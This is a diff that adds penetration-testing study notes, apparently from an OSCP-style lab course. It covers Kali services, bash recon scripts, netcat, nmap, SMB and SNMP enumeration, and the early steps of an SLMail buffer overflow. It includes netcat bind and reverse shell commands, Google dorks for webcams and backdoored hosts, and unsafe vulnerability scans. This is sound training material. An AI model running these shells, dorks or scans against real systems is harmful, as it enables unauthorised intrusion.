@@ -1,0 +1,451 @@
+# Finding files
+locate
+updatedb
+find / -name sbd* -exec {} \;
+
+# Kali Linux services
+
+## ssh
+service ssh start  - by default it is not started
+netstat -antp | grep ssh    - to see if ssh daemon is running
+service ssh stop
+
+## http
+check if it runs in the browser by going to http://127.0.0.1:80
+service apache2 start
+Apache Document root: /var/www
+
+## /etc/init.d scripts
+
+The 'service' command are just wrappers around the /etc/init.d.
+This is a folder with service scripts (apache2, ssh etc)
+
+/etc/init.d/ssh stop is the same as the above service script
+
+### Commands:
+    - start
+    - stop
+    - restart
+
+## Service boot persistence
+
+update-rc.d ssh enable
+update-rc.d apache2 enable
+
+This will help with persisting services across machine boots.
+
+# Bash
+
+GNU Born Agains Shell
+Scripting engine. 
+
+## Scenario1
+
+cut: to break up a line to fields
+sort -u: unique elements
+grep: search
+
+Find all the cisco.com sub-domains listed on their index page and then
+find the corresponging IP addresses.
+
+wget www.cisco.com
+cat index.html | grep href=   - to see the links in the index.html    
+
+We should try to extract the url using the 'cut' command.
+using cut with delimiter "/" the first field on each line is up to the ...href="http:"
+
+cat index.html | grep href= | cut -d"/" -f3 | more
+
+This is still far from optimal. Has lots of junk in the result. Filter out which does not have cisco.com in the line.
+
+cat index.html | grep href= | cut -d"/" -f3 | grep "cisco\.com"
+
+Getting better. Some of them has the " at the end. So use cut again to cut based on the quote as a delimiter.
+
+cat index.html | grep href= | cut -d"/" -f3 | grep "cisco\.com" | cut -d'"' -f1
+
+Now the list is clean but we have lots of duplicate entries.
+
+Use 'sort -u' where -u means unique.
+
+cat index.html | grep href= | cut -d"/" -f3 | grep "cisco\.com" | cut -d'"' -f1 | sort -u
+
+Warning: The above command misses some links! Some links do not start with http.
+
+### Regular expressions
+
+We can tidy up the above by using the regex feature of grep
+
+grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html | sort -u
+
+
+grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html | sort -u > cisco.txt
+
+Use bash for loop in a bash script to resolve the ip addresses.
+
+### Host command
+
+Use the 'host' command
+
+host www.cisco.com 
+
+Inspect the output structure of the host command and try to grep the output of the host command.
+
+host www.cisco.com | grep "has address" | cut -d" " -f4
+
+#!/bin/bash
+
+for url in $(cat cisco.txt); do
+host $url | grep "has address" | cut -d" " -f4
+done
+
+
+for url in $(grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html | sort -u); do host $url | grep "has address" | cut -d" " -f4; done
+
+
+
+## Scenario2
+
+Ping sweeper:
+-------------
+
+Bash script to ping an IP range and will inform us which IP address responds to our ICMP requests.
+
+See how ping command works, on Linux it continues pinging indefinitely.
+We need to limit the number of pign requests sent.
+
+-c : count - number of ICMP requests to send 
+
+ping-loop.sh
+
+#!/bin/bash
+
+for ip in $(seq 200 210); do
+ping -c 1 10.11.1.$ip | grep "bytes from" | cut -d" " -f4| cut -d":" -f1
+done 
+
+We should run them in parallel to speed it up.
+We can do this by starting them in the background!
+This way a new ping command starts immediately - no need to wait for each to complete. Add an ampersand.
+
+for ip in $(seq 1 254); do
+ping -c 1 10.11.1.$ip | grep "bytes from" | cut -d" " -f4| cut -d":" -f1 &
+done 
+
+
+
+# Essential Tools
+
+## netcat
+
+tcp/udp
+client and server modes
+check if ports are open or closed also interact with network services.
+
+Example: on win7 machine start up the Mercury mail server and interact with it using netcat.
+
+nc -nv $WIN7_offsec_machine_ip 25
+nc -nv $WIN7_offsec_machine_ip 110  - POP3
+This POP3 will return a typical POP3 banner.
+nc -nv $WIN7_offsec_machine_ip 143  - IMAP2
+
+
+## Executing command
+
+netcat 
+
+## Bind shell
+
+Bod sets up a listening connection with cmd.exe and lets Alice connect to him.
+
+Bob - windows machine
+Alice - Kali machine
+
+Bob has public IP - accessible from the internet.
+Alice is behind a firewall and has an internal IP.
+
+Bob  : C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
+Alice: root@kali:~# nc -nv a.b.c.d 4444
+
+Bob needs alice to connect to his computer and take control for administration purposes.
+
+Look at RFC1918 to see how private internet address allocation works.
+
+
+## Reverse shell
+
+Alice: nc -nv a.b.c.d 4444 -e /bin/bash
+Bob: nc -nlvp 4444
+
+
+
+Alice can not set up a bind shell to accept connections because she is behind a firewall.
+Alice can make outbound connections though to bob. Bob is listening and Alice cponnects to him. Then Bod can execute comands on Alice.
+
+- Bind shell: Target initiates the listening and lets the attacker connect to him/her
+- Reverse shell: Target connects to the listening attacker (usually if the target is behind a firewall - can not have incoming connections but can do outgoing connections)
+
+# Ncat
+
+Modern day rewrite of netcat. Netcat does not do enryption and also does not limit who can connect to a listener. 
+We want both. Encryption helps to hide the penetration tester from intursion detection systems.
+Connection limitatation aids in reducing the possible attackers connecting.
+
+SSL encryption
+Whitelist IP addresses.
+
+## Secure bind shell
+
+Bob sets up a bind shell and allows only Alice to connect.
+
+Bob: ncat -lvp 4444 --allow AliceIP --ssl
+Alice: ncat -v BobIP 4444 --ssl
+
+
+# Passive information gathering
+
+## Google hacking
+
+site:"microsoft.com" filetype:ppt "penetration testing"
+site:"microsoft.com" -site:"www.microsoft.com"  // - exclude www.microsoft.com
+intitle:"VNC viewer for Java"   // remote desktop
+inurl:"/control/userimage.html" // web cam
+
+### USEFUL:
+inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin   // misconfigured php admin panel
+
+intitle:"-N3t" filetype:php undetectable     // compromised machines by a known php backdoor
+
+## Google Hacking DataBase (GHDB)
+
+www.exploit-db.com
+
+Different categories of google hacking.
+
+# Active Information Gathering
+
+More aggressive, direct contact with the target's network.
+Should not be done without a permit on the target's host.
+
+## DNS Enumeration
+
+host -t ns megacorpone.com
+
+## Zone transfer
+
+If name server misconfigure we can ask for the domains to be transfered to us.
+
+host -t ns megacorpone.com
+host -l megacorpone.com ns2.megacorpone.com
+
+## Port Scans
+
+  - Connect scan: 3 way handshake completed -> port open
+  - SYN scan: we send SYN and wait for SYN,ACK without sending the final ACK, note, this is still registrered by firewalls
+  - UDP scan: if port is not open we get an ICMP Destination unreachable message back - if open we get no answer back
+
+## nmap
+
+/usr/local/share/nmap
+/usr/share/nmap
+
+### NSE scripts:
+/usr/local/share/nmap/scripts
+
+
+SMB (Server Message Block) enumeration
+--------------------------------------
+
+SMB protocol
+Security of SMB is infamous. Microsoft SMB vulnerabilities.
+Microsoft vulnerabilities has caused many troubles.
+
+SMB NetBios on port 445 and 139
+nmap -p139,445 10.11.1.1-254 --open   // display only machines with open port
+
+More specialized tools for this.
+
+nbtscan
+-------
+Program for scanning networks for NetBIOS name information.
+
+nbtscan 10.11.1.1-254
+
+smb null session
+----------------
+unauthenticated netbios session. To get information about a machine.
+
+Legacy windows machines are exploitable with old smb services.
+
+rpcclient
+
+install: sudo apt-get install smbclient
+
+Should run against a server running Windows 2000 server
+
+rpcclient -U "" -W "" 10.11.1.8
+
+enum4linux
+----------
+
+eunm4linux -v 10.11.1.8
+
+!!nmap nse smb scripts
+--------------------
+
+ls -l /usr/local/share/nmap/scripts/ | grep smb
+
+nmap -p 139,445 --script smb-enum-users 10.11.1.24
+nmap -p 139,445 --script smb-enum-users 10.11.1.227
+
+The above two machines have many users and SMB info.
+
+nmap --script smb-os-discovery 10.11.1.227
+
+nmap --script vuln --script-args=unsafe=1 10.11.1.227
+
+
+## SNMP
+
+Port 161
+
+Tool: nmap, onesixtyone, snmpwalk
+
+$ onesixtyone -c community -i ips
+10.11.1.227 [public] Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.0 (Build 2195 Uniprocessor Free)
+
+$ snmpwalk -c public -v1 10.11.1.227
+
+
+VULNERABILITY SCANNING
+======================
+
+Aggressive.
+Discover and identify possibilities in the network and services.
+Usually tools aid us.
+
+Aggressive active information gathering.
+Malicious looking network traffic is generated.
+
+NSE scripts
+-----------
+
+Good to search for vulnerabilites.
+
+nmap --script vuln $HOST
+sudo nmap --script smb-vuln-* 10.11.1.22
+sudo nmap -v -p 80 --script http-vuln-cve2010-2861 10.11.1.1-254
+// --all: all relevant scripts against a given target - throw everything at the target
+nmap -v -p 80 --script all 10.11.1.10
+
+
+OpenVAS
+-------
+
+Open source Vulnerability Scanner
+
+
+Windows Buffer Overflow
+=======================
+
+Example
+-------
+SLMail v5.5 has a buffer overflow vulnerabilty.
+Providing an overly long password can trigger the overflow.
+
+pattern_create.rb - creates a string that can help us locate the EIP in the buffer.
+
+Issue: Need to run: bundle exec tools/exploit/pattern_create.rb
+
+pattern_offset.rb - to see the offset of the pattern contained in EIP
+
+
+Shellcode
+---------
+
+./shellcraft -f d i386.linux.sh
+
+- pwntools
+- metasploit
+
+Bad characters, encoding.
+
+How to choose place for the shellcode? We need some place that does not change.
+
+Mona script
+-----------
+
+Immunity script - Corelan.be tram created it
+
+in Immunity Debugger's command line:
+!mona modules
+
+Chose a module where there is no ASLR, no DEP and the memory range does not contain bad characters.
+
+In our SLMAIL case the SLMFC.DLL matches these criterias.
+
+No need to bypass DEP or ASLR.
+
+DEP, ASLR - Check the lab reference notes!
+
+SLMFC loads at the same at address on each reboot.
+We need to find a JMP ESP instruction. (We control ESP with the buffer overflow)
+
+We can search for jmp esp or "push esp; retn".
+We can also search for this pattern not only in the .text section but the .data
+since SLMFC does not have DEP.
+
+We can use mona.py to search for the byte sequence that makes up the 'jmp esp'.
+
+But what is the opcode of jmp esp? metasploit script nasm_shell.rb can tell us.
+
+nasm_shell.rb   -- invokes the interactive nasm shell. 
+
+geri@geri-XPS-13-9360:~/Desktop/nmap/scripts$ nasm_shell.rb
+nasm > jmp esp
+00000000  FFE4              jmp esp
+
+!mona find -s "\xff\xe4" -m slmfc.dll
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
